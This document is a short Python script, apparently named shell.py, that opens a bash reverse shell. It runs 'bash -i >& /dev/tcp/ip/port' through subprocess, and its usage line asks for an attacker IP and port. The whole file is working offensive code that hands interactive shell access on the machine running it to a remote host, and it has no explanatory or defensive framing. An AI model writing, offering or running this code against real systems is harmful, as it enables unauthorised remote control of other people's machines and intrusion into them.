import sys
import subprocess

def reverse_shell(ip, port):
    bash_command = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    subprocess.run(bash_command, shell=True, executable="/bin/bash")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python shell.py <attacker-ip> <port>")
        sys.exit(1)

    ip = sys.argv[1]
    port = sys.argv[2]

    reverse_shell(ip, port)